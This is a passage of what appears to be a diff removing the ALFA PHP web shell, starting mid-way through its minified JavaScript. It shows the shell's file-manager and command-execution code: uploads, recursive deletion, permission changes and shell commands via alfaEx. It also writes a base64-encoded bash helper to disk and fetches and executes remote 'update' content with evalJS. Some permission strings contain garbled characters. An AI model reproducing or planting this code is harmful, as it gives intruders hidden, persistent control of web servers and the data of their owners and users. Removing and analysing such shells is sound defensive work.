u=a;"file"==r?(u="&file="+a,s.setAttribute("href","#action=fileman&path="+c_+"/"+u),s.setAttribute("target","_blank"),s.onclick=function(){}):(s.setAttribute("href","javascript:void(0)"),s.removeAttribute("target"),s.onclick=function(){alfaFilesManNewTab(c_,u)});break;case"delete":s.setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';");break;case"download":s.setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')");break;case"permission":try{var p=d.querySelector("#id_chmode_"+i.replace("id_","")+" span").innerHTML;s.setAttribute("perm",p.trim())}catch(e){}break;case"link":s.style.display="block";var f="<?php echo $_SERVER["DOCUMENT_ROOT"]; ?>/",m=(c_+"/"+a).replace(/\/\//g,"/");if(-1!=m.indexOf(f)){f=m.replace(f,"");var b=location.origin+"/"+f;s.setAttribute("href",""+b)}else s.style.display="none"}}var y=e.clientX,_=e.clientY;alfaRightClickMenu(y,_),e.preventDefault()})})}function alfaFilesManNewTab(e,t,a){var i=t;void 0!==a&&(i=alfaGetLastFolderName(e));var l=decodeURIComponent(e+"/"+t);l=l.replace(/\/\//g,"/");var r=$("filesman_tab_1"),o=r.getAttribute("fm_counter");o=parseInt(o)+1,r.setAttribute("fm_counter",o),d.querySelector("#filesman_tabs_child").insertAdjacentHTML("beforeend",'<div onmouseover="alfaFilesmanTabShowTitle(this,event);" onmouseout="alfaFilesmanTabHideTitle(this,event);" path="'+l+'" id="filesman_tab_'+o+'" fm_id="'+o+'" onclick="filesmanTabController(this);" fname="'+t+'" class="filesman_tab"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span class="filesman-tab-folder-name">'+i+'</span> <img fm_id="'+o+'" onclick="closeFmTab(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector(".ajaxarea").insertAdjacentHTML("beforebegin",'<div style="position:relative;" fm_id="'+o+'" id="filesman_holder_'+o+'" class="ajaxarea"><div class="header"></div></div>'),alfa_fm_id=o,g("FilesMan",l),alfa_fm_id=0}function alfaFilesmanTabShowTitle(e,t){t.stopPropagation();var a=$("filesman-tab-full-path");a.style.display="block",a.style.top=e.offsetTop-37+"px",a.style.left=e.offsetLeft-$("filesman_tabs").scrollLeft+"px",a.innerHTML=e.getAttribute("path")}function alfaFilesmanTabHideTitle(e,t){$("filesman-tab-full-path").style.display="none"}function alfaPopupAction(e,t){var a="",i="";switch(t){case"rename":a="Old file name:",i="New file name:";break;case"copy":a="File path:",i="Enter the file path that you want to copy this file to:";break;case"move":a="Current Path:",i="Enter the file path that you want to move this file to:";break;case"extract":a="Files to extract:",i="Enter the path you wish to extract the files to and click Extract:"}var l=e.getAttribute("fname"),r=e.getAttribute("path"),o=t.charAt(0).toUpperCase()+t.slice(1);if("permission"==t){d.querySelector("#shortcutMenu-holder").style.height="222px",o="Change Permissions",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="block",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="none";var n=e.getAttribute("perm"),s=n.substr(1,1),c=n.substr(2,1),u=n.substr(3,1);d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s,d.querySelector("#shortcutMenu-holder > form input[name=g]").value=c,d.querySelector("#shortcutMenu-holder > form input[name=w]").value=u,autoCheckPerms(s,"u",["u","g","w"]),autoCheckPerms(c,"g"),autoCheckPerms(u,"w")}else d.querySelector("#shortcutMenu-holder").style.height="190px",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="block",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="none";var p="move"==t||"copy"==t?r+l:l;if("modify"==t){var f="tr_row_"+e.getAttribute("fid").replace("id_","");p=d.querySelector("#"+f+" .main_modify").innerText}d.querySelector(".cl-popup-fixed").style.display="block",d.querySelector("#shortcutMenu-holder .popup-head").innerHTML=o,d.querySelector("#shortcutMenu-holder .old-path-lbl").innerHTML=a,d.querySelector("#shortcutMenu-holder .new-filename-lbl").innerHTML=i,d.querySelector("#shortcutMenu-holder .popup-foot > button[name=accept]").innerHTML=o,d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=r+l,d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value=p,d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("fid",e.getAttribute("fid")),d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("action",t)}function calcperm(){var e=event.srcElement;autoCheckPerms(e.checked,e.name.substr(0,1))}function autoCheckPerms(e,t,a){if(void 0!==a)for(var i in a){var l=a[i];d.querySelector("#shortcutMenu-holder > form input[name="+l+"r]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"w]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"x]").checked=!1}var r=d.querySelector("#shortcutMenu-holder > form input[name="+t+"r]"),o=d.querySelector("#shortcutMenu-holder > form input[name="+t+"w]"),n=d.querySelector("#shortcutMenu-holder > form input[name="+t+"x]");if("boolean"!=typeof e)"7"==e?(r.checked=!0,o.checked=!0,n.checked=!0):"4"==e?r.checked=!0:"2"==e?o.checked=!0:"1"==e?n.checked=!0:"6"==e?(r.checked=!0,o.checked=!0):"3"==e?(o.checked=!0,n.checked=!0):"5"==e&&(r.checked=!0,n.checked=!0);else{var s=0;r.checked&&(s+=4),o.checked&&(s+=2),n.checked&&(s+=1),"u"==t?d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s:"g"==t?d.querySelector("#shortcutMenu-holder > form input[name=g]").value=s:"w"==t&&(d.querySelector("#shortcutMenu-holder > form input[name=w]").value=s)}}function gg(e,t,a,i,l,r){var o="filesman_holder_"+alfa_current_fm_id;alfaloader(o,"block"),data="a="+alfab64(e)+"&c="+alfab64(t)+"&alfa1="+alfab64(a)+"&alfa2="+alfab64(i)+"&alfa3="+alfab64(l)+"&ajax="+alfab64("true"),_Ajax(d.URL,data,r,!1,o)}function alfaPopUpDoAction(e){var t=e.getAttribute("action");switch(t){case"rename":case"move":case"copy":var a=e.getAttribute("fid").replace("id_",""),i=$("id_"+a).getAttribute("fname"),l=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value;l=l.trim(),i=i.trim(),gg("doActions",c_,i,l,t,function(e,i){if("rename"==t)if("done"==e){var r=$("id_"+a);updateFileEditor(a,l);var o=r.getAttribute("path")+$("id_"+a).getAttribute("fname");d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=o,r.addEventListener("animationend",function(){r.classList.remove("textEffect")}),r.classList.add("textEffect"),alfaShowNotification("Renamed...","Rename Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else alfaShowNotification("error...!","Rename Action","error");alfaloader(i,"none")});break;case"permission":var r=d.querySelector("#shortcutMenu-holder > form input[name=u]").value,o=d.querySelector("#shortcutMenu-holder > form input[name=g]").value,n=d.querySelector("#shortcutMenu-holder > form input[name=w]").value;i=(i=d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML).trim();var s=r.trim()+o.trim()+n.trim();gg("doActions",c_,i,s,t,function(e,t){alfaloader(t,"none"),alfaShowNotification(e,"Permission Action"),d.querySelector(".cl-popup-fixed").style.display="none"});break;case"modify":a=e.getAttribute("fid").replace("id_","");var c=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value,u=$("id_"+a).getAttribute("fname");gg("doActions",c_,c,u,t,function(t,a){if("ok"==t){var i="tr_row_"+e.getAttribute("fid").replace("id_","");d.querySelector("#"+i+" .main_modify").innerHTML=c,alfaShowNotification("success...","Modify Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else alfaShowNotification(t,"Modify Action","error");alfaloader(a,"none")})}}function alfaInitSoratableTab(e){Sortable.create(e,{direction:"horizontal",animation:300,ghostClass:"sortable-ghost",filter:".not-sortable"})}$("search-input").addEventListener("keydown",function(e){setTimeout(function(){var e=$("search-input").value;for(var t in d.getElementsByClassName("history-list")[0].innerHTML="",editor_files)if(-1!=editor_files[t].file.search(e)||""==e){var a=0;t==editor_current_file&&(a=" is_active"),insertToHistory(t,editor_files[t].file,a,editor_files[t].type)}},100)},!1),_Ajax(d.URL,"a="+alfab64("checkupdate"),function(e){if(0!=e.length&&"[]"!=e){var t=JSON.parse(e);if(t.hasOwnProperty("content")){d.body.insertAdjacentHTML("beforeend",t.content);try{evalJS(t.content)}catch(t){}}if(t.hasOwnProperty("copyright")&&($("alfa-copyright").innerHTML=t.copyright),t.hasOwnProperty("solevisible")&&($("alfa_solevisible").innerHTML=t.solevisible),t.hasOwnProperty("code_name")&&($("hidden_sh").innerHTML=t.code_name.replace(/\{version\}/g,t.version_number)),t.hasOwnProperty("market")){var a=d.querySelector("span.alfa_plus");if(t.market.hasOwnProperty("visible")&&"yes"==t.market.visible&&($("menu_opt_market").style.display="inline"),"open"!=t.market.status&&(a.style.color="#ffc107"),t.market.hasOwnProperty("content"))try{evalJS(t.market.content)}catch(t){}}}}),<?php echo $GLOBALS["need_to_update_header"]; ?>?_Ajax(d.URL,"a="+alfab64("updateheader"),function(e){try{var t=JSON.parse(e);for(var a in t){for(var i="",l=0;l<t[a].length;l++)i+="useful"==a||"downloader"==a?'<span class="header_values" style="margin-left: 4px;">'+t[a][l]+"</span>":t[a][l];var r=$("header_"+a);r&&(r.innerHTML=i)}$("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on")}catch(e){}}):islinux&&_Ajax(d.URL,"a="+alfab64("checkcgi"),function(e){"ok"==e&&($("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on"))}),function(){d.onclick=function(){can_hashchange_work=!1,setTimeout(function(){can_hashchange_work=!0},600)},window.onhashchange=function(e){can_hashchange_work&&alfaCheckUrlHash()},alfaCheckUrlHash(),alfagetFlags(),rightclick_menu_context=$("rightclick_menu").style,alfaInitCwdContext(),document.addEventListener("click",function(e){rightclick_menu_context.opacity="0",setTimeout(function(){rightclick_menu_context.visibility="hidden"},501)},!1);var e=document.createElement("script");e.src="https://cdnjs.cloudflare.com/ajax/libs/Sortable/1.10.2/Sortable.min.js",e.id="sortable-plugin",e.onload=function(){alfaInitSoratableTab($("filesman_tabs_child")),alfaInitSoratableTab(d.querySelector(".editor-tabs")),alfaInitSoratableTab(d.querySelector(".options_tab")),alfaInitSoratableTab(d.querySelector(".terminal-tabs")),alfaInitSoratableTab(d.querySelector(".sql-tabs"))},d.body.appendChild(e)}();
-</script>
-</body>
-</html>
-<?php
-}}
-if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
-function posix_getpwuid($p) {return false;} }
-if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) {
-function posix_getgrgid($p) {return false;} }
-function alfaWhich($p) {
-$path = alfaEx('which ' . $p,false,false);
-if(!empty($path))
-return strlen($path);
-return false;
-}
-function alfaSize($s) {
-if($s >= 1073741824)
-return sprintf('%1.2f', $s / 1073741824 ). ' GB';
-elseif($s >= 1048576)
-return sprintf('%1.2f', $s / 1048576 ) . ' MB';
-elseif($s >= 1024)
-return sprintf('%1.2f', $s / 1024 ) . ' KB';
-else
-return $s . ' B';
-}
-function alfaPerms($p) {
-if (($p & 0xC000) == 0xC000)$i = 'sÃ¢â‚¬â€¹';
-elseif (($p & 0xA000) == 0xA000)$i = 'lÃ¢â‚¬â€¹';
-elseif (($p & 0x8000) == 0x8000)$i = '-Ã¢â‚¬â€¹';
-elseif (($p & 0x6000) == 0x6000)$i = 'bÃ¢â‚¬â€¹';
-elseif (($p & 0x4000) == 0x4000)$i = 'dÃ¢â‚¬â€¹';
-elseif (($p & 0x2000) == 0x2000)$i = 'cÃ¢â‚¬â€¹';
-elseif (($p & 0x1000) == 0x1000)$i = 'pÃ¢â‚¬â€¹';
-else $i = 'uÃ¢â‚¬â€¹';
-$i .= (($p & 0x0100) ? 'rÃ¢â‚¬â€¹' : '-');
-$i .= (($p & 0x0080) ? 'wÃ¢â‚¬â€¹' : '-');
-$i .= (($p & 0x0040) ? (($p & 0x0800) ? 'sÃ¢â‚¬â€¹' : 'xÃ¢â‚¬â€¹' ) : (($p & 0x0800) ? 'SÃ¢â‚¬â€¹' : '-'));
-$i .= (($p & 0x0020) ? 'rÃ¢â‚¬â€¹' : '-');
-$i .= (($p & 0x0010) ? 'wÃ¢â‚¬â€¹' : '-');
-$i .= (($p & 0x0008) ? (($p & 0x0400) ? 'sÃ¢â‚¬â€¹' : 'xÃ¢â‚¬â€¹' ) : (($p & 0x0400) ? 'SÃ¢â‚¬â€¹' : '-'));
-$i .= (($p & 0x0004) ? 'rÃ¢â‚¬â€¹' : '-');
-$i .= (($p & 0x0002) ? 'wÃ¢â‚¬â€¹' : '-');
-$i .= (($p & 0x0001) ? (($p & 0x0200) ? 'tÃ¢â‚¬â€¹' : 'xÃ¢â‚¬â€¹' ) : (($p & 0x0200) ? 'TÃ¢â‚¬â€¹' : '-'));
-return $i;
-}
-function alfaPermsColor($f,$isbash=false){
-$class = "";
-$num = "";
-$human = "";
-if($isbash){
-$class = $f["class"];
-$num = $f["num"];
-$human = $f["human"];
-}else{
-$num = substr(sprintf('%o', @fileperms($f)),-4);
-$human = alfaPerms(@fileperms($f));
-if(!@is_readable($f))
-$class = "main_red_perm";
-elseif (!@is_writable($f))
-$class = "main_white_perm";
-else
-$class = "main_green_perm";
-}
-return '<span style="font-weight:unset;" class="'.$class.'">'.$num.'</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="'.$class.'">'.$human.'</span>';
-}
-if(!function_exists("scandir")) {
-function scandir($dir) {
-$dh = opendir($dir);
-while (false !== ($filename = readdir($dh)))
-$files[] = $filename;
-return $files;
-}
-}
-function reArrayFiles($file_post){
-$file_ary = array();
-$file_count = count($file_post['name']);
-$file_keys = array_keys($file_post);
-for ($i=0; $i<$file_count; $i++) {
-foreach ($file_keys as $key) {
-$file_ary[$i][$key] = $file_post[$key][$i];
-}
-}
-return $file_ary;
-}
-function _alfa_can_runCommand($cgi=true,$cache=true){
-	if(isset($_COOKIE["alfa_canruncmd"])&&$cache){
-		return true;
-	}
-	if(strlen(alfaEx("whoami",false,$cgi))>0){
-		$_COOKIE["alfa_canruncmd"] = true;
-		return true;
-	}
-	return false;
-}
-function _alfa_symlink($target, $link){
-	$phpsym = function_exists("symlink");
-	if($phpsym){
-		@symlink($target, $link);
-	}else{
-		alfaEx("ln -s '".addslashes($target)."' '".addslashes($link)."'");
-	}
-}
-function _alfa_file_exists($file,$cgi=true){
-	if(@file_exists($file)){
-		return true;
-	}else{
-		if(strlen(alfaEx("ls -la '".addslashes($file)."'",false,$cgi))>0){
-			return true;
-		}
-	}
-	return false;
-}
-function _alfa_file($file,$cgi=true){
-	$array = @file($file);
-	if(!$array){
-		if(strlen(alfaEx("id",false,$cgi))>0){
-			$data = alfaEx('cat "'.addslashes($file).'"',false,$cgi);
-			if(strlen($data)>0){
-				return explode("\n", $data);
-			}else{
-				return false;
-			}
-		}else{
-			return false;
-		}
-	}else{
-		return $array;
-	}
-}
-function _alfa_is_writable($file){
-	$check = false;
-	$check = @is_writable($file);
-	if(!$check){
-		if(_alfa_can_runCommand()){
-			$check = alfaEx('[ -w "'.trim(addslashes($file)).'" ] && echo "yes" || echo "no"');
-			if($check == "yes"){
-				$check = true;
-			}else{
-				$check = false;
-			}
-		}
-	}
-	return $check;
-}
-function _alfa_is_dir($dir,$mode="-d"){
-	$check = false;
-	$check = @is_dir($dir);
-	if($mode == "-e"){
-		$check = @is_file($dir);
-	}
-	if(!$check){
-		if(_alfa_can_runCommand()){
-			$check = alfaEx('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
-			if($check == "yes"){
-				return true;
-			}else{
-				return false;
-			}
-		}
-	}
-	return $check;
-}
-function _alfa_load_ace_options($base){
-	return '<span>Theme: </span><select class="ace-controler ace-theme-selector" base="'.$base.'" onChange="alfaAceChangeSetting(this,\'theme\');"><option value="terminal" selected>terminal</option><option value="ambiance">ambiance</option><option value="chaos">chaos</option><option value="chrome">chrome</option><option value="clouds">clouds</option><option value="clouds_midnight">clouds_midnight</option><option value="cobalt">cobalt</option><option value="crimson_editor">crimson_editor</option><option value="dawn">dawn</option><option value="dracula">dracula</option><option value="dreamweaver">dreamweaver</option><option value="eclipse">eclipse</option><option value="github">github</option><option value="gob">gob</option><option value="gruvbox">gruvbox</option><option value="idle_fingers">idle_fingers</option><option value="iplastic">iplastic</option><option value="katzenmilch">katzenmilch</option><option value="kr_theme">kr_theme</option><option value="kuroir">kuroir</option><option value="merbivore">merbivore</option><option value="merbivore_soft">merbivore_soft</option><option value="mono_industrial">mono_industrial</option><option value="monokai">monokai</option><option value="nord_dark">nord_dark</option><option value="pastel_on_dark">pastel_on_dark</option><option value="solarized_dark">solarized_dark</option><option value="solarized_light">solarized_light</option><option value="sqlserver">sqlserver</option><option value="textmate">textmate</option><option value="tomorrow">tomorrow</option><option value="tomorrow_night">tomorrow_night</option><option value="tomorrow_night_blue">tomorrow_night_blue</option><option value="tomorrow_night_bright">tomorrow_night_bright</option><option value="tomorrow_night_eighties">tomorrow_night_eighties</option><option value="twilight">twilight</option><option value="vibrant_ink">vibrant_ink</option><option value="xcode">xcode</option></select><span>Language: </span><select class="ace-controler" base="'.$base.'" onChange="alfaAceChangeSetting(this,\'lang\');"><option value="php">php</option><option value="python">python</option><option value="perl">perl</option><option value="c_cpp">c/c++</option><option value="csharp">c#</option><option value="ruby">ruby</option><option value="html">html</option><option value="javascript">javascript</option><option value="css">css</option><option value="xml">xml</option><option value="sql">sql</option><option value="swift">swift</option><option value="sh">bash</option><option value="lua">lua</option><option value="powershell">powershell</option><option value="jsp">jsp</option><option value="java">java</option><option value="json">json</option><option value="plain_text">plain_text</option></select><span>Soft Wrap: </span><input type="checkbox" name="wrapmode" class="ace-controler" onClick="alfaAceChangeWrapMode(this,\''.$base.'\');" checked> | <span>Font Size: </span><button class="ace-controler" style="cursor:pointer;" onclick="alfaAceChangeFontSize(\''.$base.'\',\'+\', this);return false;">+</button> | <button style="cursor:pointer;" class="ace-controler" onclick="alfaAceChangeFontSize(\''.$base.'\', \'-\', this);return false;">-</button> | ';
-}
-function alfaFilesMan2(){
-	alfahead();
-	AlfaNum(8,9,10,7,6,5,4);
-	echo '<div style="position:relative;" fm_id="1" id="filesman_holder_1" class="ajaxarea filesman-active-content"><div class="header"></div></div>';
-	alfaFooter();
-}
-function copy_paste($c,$s,$d){
-if(@is_dir($c.$s)){
-@mkdir($d.$s);
-$h = @opendir($c.$s);
-while (($f = @readdir($h)) !== false)
-if (($f != ".") and ($f != ".."))
-copy_paste($c.$s.'/',$f, $d.$s.'/');
-} elseif(is_file($c.$s))
-@copy($c.$s, $d.$s);
-}
-function alfaFilesMan(){
-if(!empty ($_COOKIE['alfa_f']))
-$_COOKIE['alfa_f'] = @unserialize($_COOKIE['alfa_f']);
-if(!empty($_POST['alfa1'])){
-switch($_POST['alfa1']){
-case 'uploadFile':
-$move_cmd_file = false;
-$alfa_canruncmd = false;
-if($GLOBALS['glob_chdir_false']){
-	$alfa_canruncmd = _alfa_can_runCommand(true,true);
-	$move_cmd_file = true;
-}
-if(_alfa_is_writable($GLOBALS['cwd'])){
-$files = reArrayFiles($_FILES['f']);
-$ret_files = array();
-foreach($files as $file){
-if($move_cmd_file&&$alfa_canruncmd){
-	alfaEx("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
-}else{
-	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
-		$ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($file['name'])):array("name" => "????");
-		$gr = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($file['name'])):array("name" => "????");
-		$file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($file['name']):"????");
-		$file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($file['name']):"????");
-		$file_modify = @date('Y-m-d H:i:s', @filemtime($file['name']));
-		$file_perm = alfaPermsColor($file['name']);
-		$file_size = @filesize($file['name']);
-		$ret_files[] = array("name" => $file['name'], "size" => alfaSize($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group);
-	}
-}
-}
-if(!$move_cmd_file){
-	echo json_encode($ret_files);
-}
-}else{
-	echo "noperm";
-	return;
-}
-if(!$move_cmd_file){
-return;
-}
-break;
-case 'mkdir':
-$new_dir_cmd = false;
-if($GLOBALS['glob_chdir_false']){
-	if(_alfa_can_runCommand(true,true)){
-		if(_alfa_is_writable($GLOBALS['cwd'])){
-			if(!_alfa_is_dir(trim($_POST['alfa2']))){
-				alfaEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['alfa2']))."'");
-				echo "<script>alfaShowNotification('".addslashes($_POST['alfa2'])." created...', 'Files manager');</script>";
-			}else{
-				echo "<script>alfaShowNotification('folder already existed', 'Files manager', 'error');</script>";
-			}
-		}else{
-			echo "<script>alfaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
-		}
-	}else{
-		echo "<script>alfaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
-	}
-}else{
-	if(_alfa_is_writable($GLOBALS['cwd'])){
-		if(!_alfa_is_dir(trim($_POST['alfa2']))){
-			if(!@mkdir(trim($_POST['alfa2']))){
-				echo "<script>alfaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
-			}else{
-				echo "<script>alfaShowNotification('".addslashes($_POST['alfa2'])." created...', 'Files manager');</script>";
-			}
-		}else{
-			echo "<script>alfaShowNotification('folder already existed', 'Files manager', 'error');</script>";
-		}
-	}else{
-		echo "<script>alfaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
-	}
-}
-break;
-case 'delete':
-function deleteDir($path){
-$path = (substr($path,-1)=='/') ? $path:$path.'/';
-$dh = @opendir($path);
-while(($item = @readdir($dh)) !== false){
-$item = $path.$item;
-if((basename($item) == "..") || (basename($item) == "."))
-continue;
-$type = @filetype($item);
-if ($type == "dir")
-deleteDir($item);
-else
-@unlink($item);
-}
-@closedir($dh);
-@rmdir($path);
-}
-if(is_array(@$_POST['f']))
-foreach($_POST['f'] as $f){
-if($f == '..')
-continue;
-$f = rawurldecode($f);
-if($GLOBALS["glob_chdir_false"]){
-	if(_alfa_can_runCommand(true,true)){
-		alfaEx("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
-	}
-}else{
-alfaEx("rm -rf '".addslashes($f)."'",false,false);
-if(@is_dir($f))
-deleteDir($f);
-else
-@unlink($f);
-}
-}
-if(@is_dir(rawurldecode(@$_POST['alfa2']))&&rawurldecode(@$_POST['alfa2'])!='..'){
-deleteDir(rawurldecode(@$_POST['alfa2']));
-alfaEx("rm -rf '".addslashes($_POST['alfa2'])."'",false,false);
-}else{
-@unlink(rawurldecode(@$_POST['alfa2']));
-}
-if($GLOBALS["glob_chdir_false"]){
-	$source = rawurldecode(@$_POST['alfa2']);
-	if($source!='..'&&!empty($source)){
-		if(_alfa_can_runCommand(true,true)){
-			alfaEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
-		}
-	}
-}
-if(is_array($_POST['f']))
-return;
-break;
-case 'paste':
-if($_COOKIE['alfa_act'] == 'copy'&&isset($_COOKIE['alfa_f'])){
-foreach($_COOKIE['alfa_f'] as $f)
-copy_paste($_COOKIE['alfa_c'],$f, $GLOBALS['cwd']);
-}elseif($_COOKIE['alfa_act'] == 'move'&&isset($_COOKIE['alfa_f'])){
-function move_paste($c,$s,$d){
-if(@is_dir($c.$s)){
-@mkdir($d.$s);
-$h = @opendir($c.$s);
-while (($f = @readdir($h)) !== false)
-if(($f != ".") and ($f != ".."))
-copy_paste($c.$s.'/',$f, $d.$s.'/');
-}elseif(@is_file($c.$s))
-@copy($c.$s, $d.$s);
-}
-foreach($_COOKIE['alfa_f'] as $f)
-@rename($_COOKIE['alfa_c'].$f, $GLOBALS['cwd'].$f);
-}elseif($_COOKIE['alfa_act'] == 'zip'&&isset($_COOKIE['alfa_f'])){
-if(class_exists('ZipArchive')){
-$zip = new ZipArchive();
-$zipX = "alfa_".rand(1,1000).".zip";
-if($zip->open($zipX, 1)){
-@chdir($_COOKIE['alfa_c']);
-foreach($_COOKIE['alfa_f'] as $f){
-if($f == '..')continue;
-if(@is_file($_COOKIE['alfa_c'].$f))
-$zip->addFile($_COOKIE['alfa_c'].$f, $f);
-elseif(@is_dir($_COOKIE['alfa_c'].$f)){
-$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/'));
-foreach($iterator as $key=>$value){
-$key = str_replace('\\','/',realpath($key));
-if(@is_dir($key)){
-if(in_array(substr($key, strrpos($key,'/')+1),array('.', '..')))continue;
-}else{$zip->addFile($key,$key);}}}}
-@chdir($GLOBALS['cwd']);
-$zip->close();
-__alert('>> '.$zipX.' << is created...');}}
-}elseif($_COOKIE['alfa_act'] == 'unzip'&&isset($_COOKIE['alfa_f'])){
-if(class_exists('ZipArchive')){
-$zip = new ZipArchive();
-foreach($_COOKIE['alfa_f'] as $f) {
-if($zip->open($_COOKIE['alfa_c'].$f)){
-$zip->extractTo($_COOKIE['alfa_cwd']);
-$zip->close();}}}}
-unset($_COOKIE['alfa_f']);
-break;
-default:
-if(!empty($_POST['alfa1'])){
-if(in_array($_POST['alfa1'], array("copy", "move", "zip", "unzip"))){
-__alfa_set_cookie('alfa_act', @$_POST['alfa1']);
-__alfa_set_cookie('alfa_f', @serialize($_POST['f']));
-__alfa_set_cookie('alfa_c', @$_POST['c']);
-return;
-}
-}
-break;
-}
-}
-$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
-if(preg_match("#(.*)\/\.\.#", $_POST['c'], $res)){
-	$path = explode('/', $res[1]);
-	array_pop($path);
-	$_POST['c'] = implode('/', $path);
-}
-$cmd_dir = false;
-if($dirContent === false){
-	if(_alfa_can_runCommand(true,true)){
-		$tmp_getdir_path = @$_COOKIE["alfachdir_bash_path"];
-		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
-		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/alfacgiapi/getdir.alfa")){
-			$bash = "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
-			$tmp_getdir_path = alfaWriteTocgiapi("getdir.alfa",$bash);
-			__alfa_set_cookie("alfachdir_bash", "true");
-			__alfa_set_cookie("alfachdir_bash_path", $tmp_getdir_path);
-		}
-		$dirContent = alfaEx("cd ".$tmp_getdir_path."/alfacgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
-		$dirContent = json_decode($dirContent, true);
-		if(is_array($dirContent)){
-			array_pop($dirContent);
-			$cmd_dir = true;
-		}else{
-			$dirContent = false;
-		}
-	}
-}
-alfahead();
-AlfaNum(8,9,10,7,6,5,4);
-$count_dirContent = @count($dirContent);
-if($count_dirContent > 300){
-	@$_COOKIE["alfa_limited_files"] = 100;
-}
-$alfa_sort_by = isset($_COOKIE["alfa_sort_by"]) ? $_COOKIE["alfa_sort_by"] : 'name';
-$alfa_limited_files = isset($_COOKIE["alfa_limited_files"]) ? (int)$_COOKIE["alfa_limited_files"] : 0;
-$alfa_files_page_number = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 1;
-$alfa_filesman_direction = isset($_COOKIE["alfa_filesman_direction"]) ? $_COOKIE["alfa_filesman_direction"] : 'asc';
-$files_page_count = 1;
-if($alfa_limited_files > 0){
-	$files_page_count = ceil($count_dirContent/$alfa_limited_files);
-	if($files_page_count > 1){
-		$files_page_count++;
-	}
-}
